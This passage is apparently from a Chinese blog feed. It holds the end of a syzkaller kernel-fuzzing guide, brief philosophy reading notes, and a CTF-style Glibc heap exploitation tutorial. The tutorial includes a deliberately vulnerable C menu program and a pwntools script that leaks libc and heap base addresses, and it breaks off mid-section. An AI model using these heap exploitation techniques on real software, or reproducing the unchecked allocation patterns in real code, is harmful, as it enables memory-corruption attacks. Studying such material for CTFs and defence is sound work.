id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><p>在开始 Fuzz 之前我们需要修改 syzkaller 的运行配置启用这些系统调用。修改my.cfg，添加以下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;enable_syscalls&quot;</span>: [  <br>    <span class="hljs-string">&quot;open<span class="hljs-variable">$proc</span>&quot;</span>,  <br>    <span class="hljs-string">&quot;read<span class="hljs-variable">$proc</span>&quot;</span>,  <br>    <span class="hljs-string">&quot;write<span class="hljs-variable">$proc</span>&quot;</span>,  <br>    <span class="hljs-string">&quot;close<span class="hljs-variable">$proc</span>&quot;</span>  <br>],<br></code></pre></td></tr></table></figure><p>开始 Fuzz：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bin/syz-manager </span>-<span class="hljs-built_in">config</span> my.cfg -vv <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>过一段时间我们就可以得到：</p><p>然后 syzkaller 就会复现 crash。</p><h3 id="分析crash"><a href="#分析crash" class="headerlink" title="分析crash"></a>分析crash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>  -kernel arch/x86/boot/bzImage \<br>  -append &quot;console=ttyS0 nokaslr&quot; \<br>  -nographic \<br>  -s -S<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span> ./vmlinux<br><span class="hljs-attribute">target</span> remote :<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>使用 gdb 进行单步调试需要修改配置文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;vm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>  ...<br>  <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;qemu_args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;-gdb tcp::1234&quot;</span><br><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>然后在宿主机运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb -q build_tree/vmlinux <br>Reading symbols from build_tree/vmlinux...done.<br>(gdb) target remote :1234<br></code></pre></td></tr></table></figure><p>如果你需要调试内核模块，首先 SSH 到 VM，打印模块段地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/sys/m</span>odule<span class="hljs-regexp">/$(YOUR_MODULE)/</span>sections<span class="hljs-regexp">/.text /</span>sys<span class="hljs-regexp">/module/</span>$(YOUR_MODULE)<span class="hljs-regexp">/sections/</span>.data <span class="hljs-regexp">/sys/m</span>odule<span class="hljs-regexp">/$(YOUR_MODULE)/</span>sections/.bss<br></code></pre></td></tr></table></figure><p>添加符号文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">add-symbol-file /$(YOUR_BUILD_TREE)/$(YOUR_MODULE)/$(YOUR_MODULE).ko $(ADDR_OF_TEXT) -s data $(ADDR_OF_DATA) -s bss $(ADDR_OF_BSS)<br></code></pre></td></tr></table></figure><p>现在你就可以在模块中下断点了。 我使用 KGDB 来分析 syzkaller 触发的内核代码路径。注意：<code>-gdb</code> 选项可能会影响 VM 实例数量，因此建议仅在调试自定义 syscall 时使用。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://xz.aliyun.com/news/2394">文章 - linux下fuzz初试 - 先知社区</a><br><a href="https://www.freebuf.com/sectool/323886.html">Syzkaller入门知识总结 - FreeBuf网络安全行业门户</a><br>  <a href="https://blingblingxuanxuan.github.io/2019/10/26/syzkaller/#x86-64-linux%E8%99%9A%E6%8B%9F%E6%9C%BA">syzkaller fuzz 工具的使用方法及实践实例 | blingbling’s blog</a><br>  <a href="https://kiprey.github.io/2021/11/syzkaller_1/#1-%E5%B0%86%E6%BC%8F%E6%B4%9E%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%BF%9B-kernel">syzkaller 环境搭建 | Kiprey’s Blog</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大众哲学笔记</title>
      <link href="/2025/07/01/notes/philosophy/"/>
      <url>/2025/07/01/notes/philosophy/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>去年暑假实验室要迎接领导检查时，没地方待的我只能跑到区图书馆读书，在哲学相关书籍的书架上翻到了这本书，当看到序章中的一句话便被其深深的吸引，遂深入阅读。之后离开前记下了这本书籍的名字上网购买了一本。但因后来比赛事物繁忙，遂遗忘于书架上，昨天整理书籍时，又看到了这本书。便决定伴之于手旁，时时翻阅。</p><img src="assets/870e17cf66c2b59e13e210b0da34ba8.jpg" style="zoom: 50%;" /><h2 id="序章"><a href="#序章" class="headerlink" title="序章"></a>序章</h2><h3 id="哲学与日常生活的关系"><a href="#哲学与日常生活的关系" class="headerlink" title="哲学与日常生活的关系"></a>哲学与日常生活的关系</h3><p>并不是哲学课本中才有哲学，千万人在日常的生活和社会斗争中所发生的思想里面同样存在着哲学思想的根苗。</p><p>以上这句话的两个含义：</p><ol><li>哲学并不神奇玄妙，它与我们的日常生活联系的很紧密。</li><li>日常生活中只存在着哲学思想的根苗，并不存在系统的完整的哲学思想。</li></ol><h3 id="哲学是什么？"><a href="#哲学是什么？" class="headerlink" title="哲学是什么？"></a>哲学是什么？</h3><p>人们在面对生活的各种感想中就包含着各种哲学思想。</p><p>哲学就是人们对于整个世界的根本认识或根本看法，也就是世界观。不同的人对于世界有不同的认识。而这是由每个人的阶级处境和地位决定的。</p><p>哲学思想主要解答整个世界的问题，其他思想主要解答某一事物的问题。</p><p>哲学思想是其他各种思想的世界观基础。</p><h2 id="唯心论、二元论和唯物论"><a href="#唯心论、二元论和唯物论" class="headerlink" title="唯心论、二元论和唯物论"></a>唯心论、二元论和唯物论</h2><h3 id="哲学的两大类别"><a href="#哲学的两大类别" class="headerlink" title="哲学的两大类别"></a>哲学的两大类别</h3><h3 id="主观唯心论和客观唯心论"><a href="#主观唯心论和客观唯心论" class="headerlink" title="主观唯心论和客观唯心论"></a>主观唯心论和客观唯心论</h3><h3 id="二元论、机械唯物论"><a href="#二元论、机械唯物论" class="headerlink" title="二元论、机械唯物论"></a>二元论、机械唯物论</h3><h3 id="辩证唯物论"><a href="#辩证唯物论" class="headerlink" title="辩证唯物论"></a>辩证唯物论</h3><h2 id="辩证法唯物论的认识论"><a href="#辩证法唯物论的认识论" class="headerlink" title="辩证法唯物论的认识论"></a>辩证法唯物论的认识论</h2><h3 id="反映论"><a href="#反映论" class="headerlink" title="反映论"></a>反映论</h3><h3 id="感性认识与理性认识的矛盾"><a href="#感性认识与理性认识的矛盾" class="headerlink" title="感性认识与理性认识的矛盾"></a>感性认识与理性认识的矛盾</h3><h3 id="认识和实践"><a href="#认识和实践" class="headerlink" title="认识和实践"></a>认识和实践</h3><h3 id="真理论"><a href="#真理论" class="headerlink" title="真理论"></a>真理论</h3><h2 id="唯物辩证法的基本规律"><a href="#唯物辩证法的基本规律" class="headerlink" title="唯物辩证法的基本规律"></a>唯物辩证法的基本规律</h2><h3 id="立场、观点和方法"><a href="#立场、观点和方法" class="headerlink" title="立场、观点和方法"></a>立场、观点和方法</h3><h3 id="事物的普遍的有机联系的规律"><a href="#事物的普遍的有机联系的规律" class="headerlink" title="事物的普遍的有机联系的规律"></a>事物的普遍的有机联系的规律</h3><h3 id="事物自身运动发展的规律"><a href="#事物自身运动发展的规律" class="headerlink" title="事物自身运动发展的规律"></a>事物自身运动发展的规律</h3><h3 id="质和量互相转变的规律"><a href="#质和量互相转变的规律" class="headerlink" title="质和量互相转变的规律"></a>质和量互相转变的规律</h3><h3 id="对立统一的规律"><a href="#对立统一的规律" class="headerlink" title="对立统一的规律"></a>对立统一的规律</h3><h3 id="否定之改变的规律"><a href="#否定之改变的规律" class="headerlink" title="否定之改变的规律"></a>否定之改变的规律</h3><h2 id="唯物辩证法的几个范畴"><a href="#唯物辩证法的几个范畴" class="headerlink" title="唯物辩证法的几个范畴"></a>唯物辩证法的几个范畴</h2><h3 id="现象和本质"><a href="#现象和本质" class="headerlink" title="现象和本质"></a>现象和本质</h3><h3 id="形式和内容"><a href="#形式和内容" class="headerlink" title="形式和内容"></a>形式和内容</h3><h3 id="规律与因果"><a href="#规律与因果" class="headerlink" title="规律与因果"></a>规律与因果</h3><h3 id="偶然、比如与自由"><a href="#偶然、比如与自由" class="headerlink" title="偶然、比如与自由"></a>偶然、比如与自由</h3><h3 id="目的性、可能性与现实法"><a href="#目的性、可能性与现实法" class="headerlink" title="目的性、可能性与现实法"></a>目的性、可能性与现实法</h3>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Glibc堆利用入门</title>
      <link href="/2025/07/01/ctf/heap/heap/"/>
      <url>/2025/07/01/ctf/heap/heap/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>了解了 Ptmalloc2 的内存管理机制后，我们就可以学习一下堆的利用基础。</p><p>堆相关的漏洞无法像栈那样直接劫持控制流，在堆中的漏洞利用一般通过修改堆上的函数指针，在程序调用堆上的数据的时候达成目的。</p><p>另一种是基于对堆分配的理解，达到任意地址分配从而实现任意地址写。通过任意地址写修改libc当中的一些hook来达到劫持程序控制流的目的。</p><h2 id="堆常见漏洞"><a href="#堆常见漏洞" class="headerlink" title="堆常见漏洞"></a>堆常见漏洞</h2><h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p><p>不难发现，堆溢出漏洞发生的基本前提是</p><ul><li><p>程序向堆上写入数据。</p></li><li><p>写入的数据大小没有被良好地控制。</p></li></ul><p>对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。  </p><p>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等）。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p><ol><li>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容。<br>    - <code>prev_size</code><br>    - <code>size</code>，主要有三个比特位，以及该堆块真正的大小。<br>        - <code>NON_MAIN_ARENA</code><br>        - <code>IS_MAPPED</code><br>        - <code>PREV_INUSE</code><br>        - the True chunk size<br>    - chunk content，从而改变程序固有的执行流。</li><li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li></ol><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>Use After Free 指的就是释放后使用：当一个指针所指向的指针块被释放掉之后可以再次被使用，但是这是有要求的。</p><p>当一个内存被释放后重新使用有如下几种情况：</p><ul><li><code>chunk</code>被释放之后，其对应的指针被设置为<code>NULL</code>，如果再次使用它，程序就会崩溃。</li><li><code>chunk</code>被释放之后，其对应的指针未被设置为<code>NULL</code>，如果在下一次使用之前没有代码对这块内存进行修改，那么再次使用这个指针时程序很有可能正常运转。</li><li>内存块被释放后，其对应的指针没有被设置为<code>NULL</code>，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li></ul><p>在堆中 Use After Free 一般指的是后两种漏洞，我们一般称被释放后没有被设置为<code>NULL</code>的内存指针为<strong>dangling pointer（悬空指针、悬垂指针）</strong></p><blockquote><p>未被初始化过的内存指针称为野指针</p></blockquote><ul><li>示例</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">char</span> *p1;<br>p1=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>)*<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">memcpy</span>(p1,<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-number">10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 addr:%x,%s\n&quot;</span>,p1,p1);<br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-type">char</span> *p2;<br>p2=(<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>)*<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">memcpy</span>(p2,<span class="hljs-string">&quot;world&quot;</span>,<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p2 addr:%x,%s\n&quot;</span>,p2,p1);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上代码，指针<code>p1</code>申请<code>0x10</code>内存，打印其地址，值。</p><p>然后释放<code>p1</code></p><p>指针<code>p2</code>申请同样大小的内存，打印<code>p2</code>的地址，<code>p1</code>指针指向的值</p><p><code>p1</code>与<code>p2</code>地址相同，<code>p1</code>指针释放后，<code>p2</code>申请相同的大小的内存，操作系统会将之前给<code>p1</code>的地址分配给<code>p2</code>，修改<code>p2</code>的值，<code>p1</code>也被修改了。</p><p>由此我们可以知道：</p><ol><li>在<code>free</code>一块内存后，接着申请大小相同的一块内存，操作系统会将刚刚free掉的内存再次分配，根本原因是<code>dlmalloc</code></li></ol><blockquote><p>当应用程序调用<code>free()</code>释放内存时，如果内存块小于<code>256kb</code>，<code>dlmalloc</code>并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放回内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当<code>dlmalloc</code>中空闲内存量达到一定值时<code>dlmalloc</code>才将空闲内存释放回内核。如果应用程序申请的内存大于<code>256kb</code>，<code>dlmalloc</code>调用<code>mmap()</code>向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于<code>256kb</code>，<code>dlmalloc</code>马上调用<code>munmap()</code>释放内存。<code>dlmalloc</code>不会缓存大于<code>256kb</code>的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p></blockquote><ol start="2"><li>通过<code>p2</code>能够操作<code>p1</code>，如果之后<code>p1</code>继续被使用（use after free），则可以达到通过<code>p2</code>修改程序功能等目的。</li></ol><p>常见利用：</p><ul><li>存在show的时候，可以考虑使用 unsorted bin配合 uaf 输出main_arena的地址，计算libc</li><li>存在edit的时候，可以考虑使用大部分攻击手法</li><li>无edit的时候，考虑double free</li></ul><p>纯粹的uaf漏洞并无法进行攻击。</p><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><p>特殊的堆溢出漏洞，一字节溢出</p><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off-by-null"></a>off-by-null</h3><p>off-by-null的利用比较苛刻，一般仅能选择使用 small bin的合并进行overlap。</p><h2 id="unsorted-bin-leak"><a href="#unsorted-bin-leak" class="headerlink" title="unsorted bin leak"></a>unsorted bin leak</h2><p>由于 unsorted bin 是双向链表，因此在 unsorted bin 链表中必有一个节点的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部。如果我们可以把正确的 <code>fd</code> 指针 leak 出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过调试得出。</p><p><img src="/../../musl/assets/Pasted%20image%2020241203235534.png"></p><p>而<code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code> 文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，从而获取 libc 的基地址。</p><p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址，这样可以大幅减小工作量。以 pwntools 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">main_arena_offset = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p><p>示例程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. add chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5. exit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;choice:&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_num</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>];<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>    <span class="hljs-type">int</span> size = get_num();<br>    chunk_list[index] = <span class="hljs-built_in">malloc</span>(size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">free</span>(chunk_list[index]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;length:&quot;</span>);<br>    <span class="hljs-type">int</span> length = get_num();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;content:&quot;</span>);<br>    read(<span class="hljs-number">0</span>, chunk_list[index], length);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">puts</span>(chunk_list[index]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        menu();<br>        <span class="hljs-keyword">switch</span> (get_num()) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: add_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: delete_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: edit_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: show_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>: <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid choice.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context(arch=elf.arch, os=elf.os)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process([elf.path])<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_chunk</span>(<span class="hljs-params">index, size</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_chunk</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_chunk</span>(<span class="hljs-params">index, content</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.sendafter(<span class="hljs-string">&quot;content:&quot;</span>, content)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_chunk</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br> <br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>add_chunk(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>)<br>add_chunk(<span class="hljs-number">1</span>, <span class="hljs-number">0x80</span>)<br>add_chunk(<span class="hljs-number">4</span>, <span class="hljs-number">0x20</span>)<br>add_chunk(<span class="hljs-number">2</span>, <span class="hljs-number">0x80</span>)<br>delete_chunk(<span class="hljs-number">0</span>)<br>delete_chunk(<span class="hljs-number">1</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>show_chunk(<span class="hljs-number">0</span>)<br>libc.address = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7F&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x39bb78</span><br>info(<span class="hljs-string">&quot;libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br>edit_chunk(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>show_chunk(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recvuntil((<span class="hljs-string">&#x27;\x55&#x27;</span>, <span class="hljs-string">&#x27;\x56&#x27;</span>))[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) &amp; ~<span class="hljs-number">0xFFF</span><br>info(<span class="hljs-string">&quot;heap base: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br>gdb.attach(p)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure><p>通过堆溢出进行 unlink，然后造成任意地址写进行 getshell</p><h2 id="tcache泄露堆地址"><a href="#tcache泄露堆地址" class="headerlink" title="tcache泄露堆地址"></a>tcache泄露堆地址</h2><figure class="highlight 